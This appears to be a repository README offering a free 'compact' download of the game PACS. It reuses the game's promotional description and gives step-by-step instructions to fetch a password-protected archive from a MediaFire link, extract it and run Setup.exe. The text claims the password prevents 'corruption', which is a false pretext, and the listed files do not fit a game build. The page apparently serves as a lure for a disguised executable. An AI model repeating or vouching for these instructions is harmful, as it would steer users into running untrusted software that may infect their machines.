## 🕹️ About

PACS is a co-op delivery and vehicle simulation game set in a dangerous post-apocalyptic world. Developed by Studio 316 and published by Playstack, it is in development for Windows PC with solo and online multiplayer play for up to four couriers. Accept delivery jobs, package cargo, plan routes, drive through harsh terrain and extreme weather, and keep your vehicle and supplies in working order. Scavenge for parts, customize your vehicle, expand your courier service, and deliver everything from awkward cargo to hazardous packages. This compact release uses more efficient archive compression to reduce the download size; the game itself is unchanged, with the same content and gameplay.

PACS is for players who enjoy co-op survival, off-road driving, vehicle customization, and the satisfying challenge of completing deliveries in an unpredictable wasteland.

## ✨ Features

- 🔧 **Scavenge and Repair** — Search on foot or by vehicle for parts, supplies, and resources to keep moving.
- 📦 **Post-Apocalyptic Deliveries** — Accept jobs from the remaining communities and deliver cargo across the wasteland.
- 🤝 **Four-Player Co-op** — Team up with up to three friends or take on the courier service alone.
- 🚗 **Vehicle Customization** — Upgrade engines, wheels, batteries, drivetrains, bodywork, and delivery capacity.
- 🗺️ **Treacherous Exploration** — Navigate cracked roads, overgrown trails, extreme weather, and difficult terrain.
- ☢️ **Hazardous Cargo** — Manage awkward, explosive, or radioactive packages while protecting your delivery.

### Step 1: Download

Download the compact archive from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the build expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- driver.umap <- Driver data
|-- uninstall.key <- Uninstall key
|-- driver.pak <- Driver archive
|-- assets.wem <- Asset audio
|-- api.pak <- API modules
|-- physics.sys <- Physics engine
|-- res.pak <- Resources archive
|-- lang.sys <- Language system
|-- audio.res <- Audio resources
|-- settings.bin <- Configuration
|-- bootstrap.wem <- Bootstrap audio
|-- scripts.lic <- Game scripts
|-- patch_1.bnk <- Audio banks
|-- license.wem <- Audio assets
|-- Password 2026.txt <- Password reminder (empty)
|-- animations.dll <- Animation system
|-- update_1.ini <- Update config
|-- dlc.md5 <- DLC checksums
|-- global.cfg <- Global settings
|-- launcher.dll <- Launcher library
|-- localization.ini <- Language files
|-- update_1.res <- Update resources
|-- license.bank <- License data
|-- installer.dat <- Installer data
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start

**Q: Why is the archive password-protected?**
**A:** The password prevents the archive from being corrupted during transfer and keeps the files bundled correctly. The password is provided in the download section.

**Q: What compression format is used?**
**A:** The archive uses a standard compression format compatible with common extractors like 7-Zip, WinRAR, and WinZip.

**Q: Can I share this repository?**
**A:** Yes, you can share the link. Please don't reupload the archive itself to other platforms — keeping distribution in one place makes updates easier to track.

**Q: Is the game modified in any way?**
**A:** No. The game is exactly the same as the original release. Only the packaging is different — compression is a delivery choice, not a modification of the game.

**Q: What is this project?**
